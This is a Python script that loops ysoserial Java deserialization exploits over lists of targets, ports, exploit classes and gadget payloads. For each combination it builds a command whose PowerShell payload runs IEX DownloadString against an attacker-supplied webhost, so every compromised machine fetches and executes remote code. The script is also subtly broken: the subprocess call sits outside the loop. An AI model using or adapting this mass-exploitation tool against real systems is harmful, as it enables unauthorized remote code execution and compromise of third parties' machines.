#!/usr/bin/python3

import argparse, itertools, subprocess, time

def main():
   parser = argparse.ArgumentParser(description='ysoserial iterator')
   parser.add_argument('--targets', help='File containing a list of targets', default='targets.txt', type=argparse.FileType('r'))
   parser.add_argument('--ports', help='File containing a list of ports to try on each target', default='ports.txt', type=argparse.FileType('r'))
   parser.add_argument('--exploits', help='File containing exploits to use', default='RMIRegistryExploit.txt', type=argparse.FileType('r'))
   parser.add_argument('--payloads', help='File containing payloads to use', default='Jdk7u21.txt', type=argparse.FileType('r'))
   parser.add_argument('--host', help='Webhost', required='True')
   parser.add_argument('--port', help='Webhost Port', required='True')

   args = parser.parse_args()

   targets = [line.rstrip() for line in args.targets]
   ports = [line.rstrip() for line in args.ports]
   exploits = [line.rstrip() for line in args.exploits]
   payloads = [line.rstrip() for line in args.payloads]

   print('Targets: {0}'.format(len(targets)))
   print('Ports: {0}'.format(len(ports)))
   print('Exploits: {0}'.format(len(exploits)))
   print('Payloads: {0}'.format(len(payloads)))
   print('Total requests: {0}'.format(len(targets) * len(ports) * len(exploits) * len(payloads)))

   target_tuples = itertools.product(targets, ports, exploits, payloads)
   for target in target_tuples:
      command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/?h={0}&p={1}&e={2}&l={3}\'))\"'.format(target[0], target[1], target[2], target[3], args.host, args.port)

   subprocess.call(command, shell=True, timeout=30)
   time.sleep(2)

if __name__ == '__main__':
	main()
